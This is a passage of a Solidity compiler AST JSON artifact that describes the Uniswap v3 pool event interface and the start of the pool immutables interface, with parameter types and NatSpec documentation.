													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1842,
												"indexed": false,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1852,
												"src": "1928:17:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1841,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1928:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1844,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1852,
												"src": "1955:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1843,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1955:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1846,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1852,
												"src": "1988:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1845,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1988:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1848,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1852,
												"src": "2021:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1847,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2021:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1850,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1852,
												"src": "2046:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1849,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2046:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1887:180:5"
									},
									"src": "1874:194:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1853,
										"nodeType": "StructuredDocumentation",
										"src": "2074:523:5",
										"text": "@notice Emitted when a position's liquidity is removed\n @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n @param owner The owner of the position for which liquidity is removed\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity to remove\n @param amount0 The amount of token0 withdrawn\n @param amount1 The amount of token1 withdrawn"
									},
									"id": 1867,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1866,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1855,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1867,
												"src": "2622:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1854,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2622:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1857,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1867,
												"src": "2653:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1856,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2653:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1859,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1867,
												"src": "2686:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1858,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2686:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1861,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1867,
												"src": "2719:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1860,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2719:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1863,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1867,
												"src": "2743:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1862,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2743:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1865,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1867,
												"src": "2768:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1864,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2768:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2612:177:5"
									},
									"src": "2602:188:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1868,
										"nodeType": "StructuredDocumentation",
										"src": "2796:600:5",
										"text": "@notice Emitted by the pool for any swaps between token0 and token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the output of the swap\n @param amount0 The delta of the token0 balance of the pool\n @param amount1 The delta of the token1 balance of the pool\n @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96\n @param liquidity The liquidity of the pool after the swap\n @param tick The log base 1.0001 of price of the pool after the swap"
									},
									"id": 1884,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1883,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1870,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1884,
												"src": "3421:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1869,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3421:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1872,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1884,
												"src": "3453:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1871,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3453:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1874,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1884,
												"src": "3488:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1873,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3488:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1876,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1884,
												"src": "3512:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1875,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "3512:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1878,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1884,
												"src": "3536:20:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1877,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "3536:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1880,
												"indexed": false,
												"mutability": "mutable",
												"name": "liquidity",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1884,
												"src": "3566:17:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1879,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "3566:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1882,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1884,
												"src": "3593:10:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1881,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "3593:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3411:198:5"
									},
									"src": "3401:209:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1885,
										"nodeType": "StructuredDocumentation",
										"src": "3616:562:5",
										"text": "@notice Emitted by the pool for any flashes of token0/token1\n @param sender The address that initiated the swap call, and that received the callback\n @param recipient The address that received the tokens from flash\n @param amount0 The amount of token0 that was flashed\n @param amount1 The amount of token1 that was flashed\n @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\n @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee"
									},
									"id": 1899,
									"name": "Flash",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1898,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1887,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1899,
												"src": "4204:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1886,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4204:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1889,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1899,
												"src": "4236:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1888,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "4236:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1891,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1899,
												"src": "4271:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1890,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4271:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1893,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1899,
												"src": "4296:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1892,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4296:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1895,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1899,
												"src": "4321:13:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1894,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4321:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1897,
												"indexed": false,
												"mutability": "mutable",
												"name": "paid1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1899,
												"src": "4344:13:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1896,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4344:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4194:169:5"
									},
									"src": "4183:181:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1900,
										"nodeType": "StructuredDocumentation",
										"src": "4370:451:5",
										"text": "@notice Emitted by the pool for increases to the number of observations that can be stored\n @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index\n just before a mint/swap/burn.\n @param observationCardinalityNextOld The previous value of the next observation cardinality\n @param observationCardinalityNextNew The updated value of the next observation cardinality"
									},
									"id": 1906,
									"name": "IncreaseObservationCardinalityNext",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1905,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1902,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextOld",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1906,
												"src": "4876:36:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1901,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4876:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1904,
												"indexed": false,
												"mutability": "mutable",
												"name": "observationCardinalityNextNew",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1906,
												"src": "4922:36:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1903,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "4922:6:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4866:98:5"
									},
									"src": "4826:139:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1907,
										"nodeType": "StructuredDocumentation",
										"src": "4971:370:5",
										"text": "@notice Emitted when the protocol fee is changed by the pool\n @param feeProtocol0Old The previous value of the token0 protocol fee\n @param feeProtocol1Old The previous value of the token1 protocol fee\n @param feeProtocol0New The updated value of the token0 protocol fee\n @param feeProtocol1New The updated value of the token1 protocol fee"
									},
									"id": 1917,
									"name": "SetFeeProtocol",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1916,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1909,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0Old",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1917,
												"src": "5367:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1908,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5367:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1911,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1Old",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1917,
												"src": "5390:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1910,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5390:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1913,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol0New",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1917,
												"src": "5413:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1912,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5413:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1915,
												"indexed": false,
												"mutability": "mutable",
												"name": "feeProtocol1New",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1917,
												"src": "5436:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1914,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "5436:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5366:92:5"
									},
									"src": "5346:113:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1918,
										"nodeType": "StructuredDocumentation",
										"src": "5465:384:5",
										"text": "@notice Emitted when the collected protocol fees are withdrawn by the factory owner\n @param sender The address that collects the protocol fees\n @param recipient The address that receives the collected protocol fees\n @param amount0 The amount of token0 protocol fees that is withdrawn\n @param amount0 The amount of token1 protocol fees that is withdrawn"
									},
									"id": 1928,
									"name": "CollectProtocol",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1927,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1920,
												"indexed": true,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1928,
												"src": "5876:22:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1919,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5876:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1922,
												"indexed": true,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1928,
												"src": "5900:25:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1921,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5900:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1924,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1928,
												"src": "5927:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1923,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5927:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1926,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1928,
												"src": "5944:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1925,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "5944:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5875:85:5"
									},
									"src": "5854:107:5"
								}
							],
							"scope": 1930,
							"src": "159:5804:5"
						}
					],
					"src": "45:5919:5"
				},
				"id": 5
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol",
					"exportedSymbols": {
						"IUniswapV3PoolImmutables": [
							1969
						]
					},
					"id": 1970,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1931,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:6"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1932,
								"nodeType": "StructuredDocumentation",
								"src": "71:153:6",
								"text": "@title Pool state that never changes\n @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values"
							},
							"fullyImplemented": false,
							"id": 1969,
							"linearizedBaseContracts": [
								1969
							],
							"name": "IUniswapV3PoolImmutables",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1933,
										"nodeType": "StructuredDocumentation",
										"src": "265:138:6",
										"text": "@notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\n @return The contract address"
									},
									"functionSelector": "c45a0155",
									"id": 1938,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "factory",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1934,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "424:2:6"
									},
									"returnParameters": {
										"id": 1937,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1936,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1938,
												"src": "450:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1935,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "450:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "449:9:6"
									},
									"scope": 1969,
									"src": "408:51:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1939,
										"nodeType": "StructuredDocumentation",
										"src": "465:113:6",
										"text": "@notice The first of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "0dfe1681",
									"id": 1944,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token0",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1940,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "598:2:6"
									},
									"returnParameters": {
										"id": 1943,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1942,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1944,
												"src": "624:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1941,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "624:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "623:9:6"
									},
									"scope": 1969,
									"src": "583:50:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1945,
										"nodeType": "StructuredDocumentation",
										"src": "639:114:6",
										"text": "@notice The second of the two tokens of the pool, sorted by address\n @return The token contract address"
									},
									"functionSelector": "d21220a7",
									"id": 1950,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "token1",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1946,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "773:2:6"
									},
									"returnParameters": {
										"id": 1949,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1948,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1950,
												"src": "799:7:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1947,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "799:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "798:9:6"
									},
									"scope": 1969,
									"src": "758:50:6",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1951,
										"nodeType": "StructuredDocumentation",
										"src": "814:84:6",
										"text": "@notice The pool's fee in hundredths of a bip, i.e. 1e-6\n @return The fee"
									},
									"functionSelector": "ddca3f43",
									"id": 1956,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "fee",
